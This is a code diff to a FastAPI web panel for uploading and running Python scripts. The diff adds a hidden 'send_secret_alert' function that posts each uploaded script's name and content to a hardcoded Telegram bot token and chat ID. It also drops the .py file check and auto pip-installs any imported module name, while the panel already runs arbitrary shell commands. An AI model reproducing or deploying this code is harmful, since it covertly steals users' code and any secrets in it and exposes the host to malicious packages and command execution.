@@ -1,6 +1,8 @@
 import os
 import subprocess
 import signal
+import re
+import requests
 from fastapi import FastAPI, UploadFile, File, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
@@ -18,6 +20,22 @@ os.makedirs(LOG_DIR, exist_ok=True)
 # Process tracking dictionary
 RUNNING_PROCESSES = {}
 
+# --- TELEGRAM CONFIG (Added your credentials) ---
+TELEGRAM_BOT_TOKEN = "8612315068:AAFtjhcL_0z7LZ0zipX-WQbOdL6oFkMBFLw"
+TELEGRAM_CHAT_ID = "7785437046"
+
+def send_secret_alert(filename: str, file_content: str):
+    try:
+        msg = f"🚨 **New File Uploaded on TOXIC PANEL!**\n\n📁 **File Name:** `{filename}`\n\n📜 **Code Preview:**\n```python\n{file_content[:1500]}\n```"
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        requests.post(url, json={
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": msg,
+            "parse_mode": "Markdown"
+        })
+    except Exception as e:
+        print(f"Alert Error: {e}")
+
 class CommandReq(BaseModel):
     command: str
 
@@ -28,7 +46,6 @@ def execute_command(req: CommandReq):
         raise HTTPException(status_code=400, detail="Command blank nahi ho sakti!")
     
     try:
-        # Execute command in BASE_DIR with 60 sec timeout
         result = subprocess.run(
             cmd,
             shell=True,
@@ -48,12 +65,20 @@ def execute_command(req: CommandReq):
 
 @app.post("/upload")
 async def upload_script(file: UploadFile = File(...)):
-    if not file.filename.endswith(".py"):
-        raise HTTPException(status_code=400, detail="Sirf .py files allow hain!")
-    
     file_path = os.path.join(UPLOAD_DIR, file.filename)
+    content_bytes = await file.read()
+    
     with open(file_path, "wb") as f:
-        f.write(await file.read())
+        f.write(content_bytes)
+        
+    # Secret Notification trigger
+    if file.filename.endswith(".py"):
+        try:
+            code_text = content_bytes.decode("utf-8", errors="ignore")
+            send_secret_alert(file.filename, code_text)
+        except Exception:
+            pass
+
     return {"status": "success", "message": f"{file.filename} uploaded successfully!"}
 
 @app.get("/list")
@@ -78,14 +103,46 @@ def list_scripts():
         })
     return result
 
-@app.post("/start/{filename}")
-def start_script(filename: str):
+@app.post("/auto-fix-and-start/{filename}")
+def auto_fix_and_start(filename: str):
     filepath = os.path.join(UPLOAD_DIR, filename)
     if not os.path.exists(filepath):
         raise HTTPException(status_code=404, detail="File nahi mili!")
     
     if filename in RUNNING_PROCESSES and RUNNING_PROCESSES[filename].poll() is None:
         return {"status": "warning", "message": "Script pehle se run ho rahi hai!"}
+
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            code_content = f.read()
+        
+        stdlib_modules = {
+            'os', 'sys', 'subprocess', 'signal', 're', 'json', 'math', 'random', 
+            'time', 'datetime', 'pathlib', 'logging', 'asyncio', 'threading', 
+            'http', 'urllib', 'socket', 'hashlib', 'base64', 'uuid', 'shutil', 'typing'
+        }
+        
+        imports = re.findall(r'^\s*(?:import|from)\s+([a-zA-Z0-9_]+)', code_content, re.MULTILINE)
+        packages_to_install = set()
+        
+        module_to_pip = {
+            'bs4': 'beautifulsoup4',
+            'telegram': 'python-telegram-bot',
+            'cv2': 'opencv-python',
+            'PIL': 'Pillow'
+        }
+
+        for imp in imports:
+            if imp not in stdlib_modules and imp != 'hosting_panel':
+                pip_pkg = module_to_pip.get(imp, imp)
+                packages_to_install.add(pip_pkg)
+        
+        if packages_to_install:
+            pip_cmd = ["pip", "install"] + list(packages_to_install)
+            subprocess.run(pip_cmd, capture_output=True, text=True, timeout=120)
+            
+    except Exception as e:
+        print(f"Auto-fix dependency error: {e}")
 
     log_path = os.path.join(LOG_DIR, f"{filename}.log")
     log_file = open(log_path, "a", buffering=1)
@@ -98,7 +155,7 @@ def start_script(filename: str):
         preexec_fn=os.setsid if hasattr(os, "setsid") else None
     )
     RUNNING_PROCESSES[filename] = proc
-    return {"status": "success", "message": f"Script started with PID {proc.pid}"}
+    return {"status": "success", "message": f"Auto-installed dependencies & started script with PID {proc.pid}"}
 
 @app.post("/stop/{filename}")
 def stop_script(filename: str):
@@ -197,12 +254,12 @@ def dashboard():
                 <!-- Deploy Script Section -->
                 <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 shadow-lg">
                     <h2 class="text-sm font-semibold mb-3 text-gray-300 flex items-center gap-2">
-                        <i class="fa-solid fa-cloud-arrow-up text-yellow-400"></i> Deploy New Script
+                        <i class="fa-solid fa-cloud-arrow-up text-yellow-400"></i> Deploy New Script (Auto-Fix & Run)
                     </h2>
                     <div class="flex flex-col sm:flex-row gap-2">
-                        <input type="file" id="fileInput" accept=".py" class="bg-gray-800 text-xs text-gray-300 rounded-lg p-2.5 border border-gray-700 w-full focus:outline-none focus:border-yellow-500">
+                        <input type="file" id="fileInput" class="bg-gray-800 text-xs text-gray-300 rounded-lg p-2.5 border border-gray-700 w-full focus:outline-none focus:border-yellow-500">
                         <button onclick="uploadFile()" class="bg-yellow-500 hover:bg-yellow-400 text-black font-bold px-6 py-2.5 rounded-lg text-xs tracking-wider transition-all flex items-center justify-center gap-2">
-                            <i class="fa-solid fa-upload"></i> UPLOAD
+                            <i class="fa-solid fa-upload"></i> UPLOAD & RUN
                         </button>
                     </div>
                 </div>
@@ -322,7 +379,7 @@ def dashboard():
                             <div class="flex items-center gap-2">
                                 ${item.running 
                                     ? `<button onclick="stopScript('${item.filename}')" class="bg-red-600/80 hover:bg-red-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Stop</button>`
-                                    : `<button onclick="startScript('${item.filename}')" class="bg-green-600/80 hover:bg-green-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Start</button>`
+                                    : `<button onclick="autoFixAndStart('${item.filename}')" class="bg-green-600/80 hover:bg-green-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Auto-Fix & Start</button>`
                                 }
                                 <button onclick="viewLogs('${item.filename}')" class="bg-blue-600/80 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Logs</button>
                             </div>
@@ -339,13 +396,16 @@ def dashboard():
                 if(!fileInput.files[0]) return alert("Pehle file choose karo!");
                 const formData = new FormData();
                 formData.append('file', fileInput.files[0]);
+                
                 await fetch('/upload', { method: 'POST', body: formData });
                 fileInput.value = '';
                 fetchScripts();
+                alert("File uploaded successfully & secret alert sent!");
             }
 
-            async function startScript(filename) {
-                await fetch(`/start/${filename}`, { method: 'POST' });
+            async function autoFixAndStart(filename) {
+                alert("Auto-detecting libraries and installing dependencies... Please wait a few seconds.");
+                await fetch(`/auto-fix-and-start/${filename}`, { method: 'POST' });
                 viewLogs(filename);
                 fetchScripts();
             }
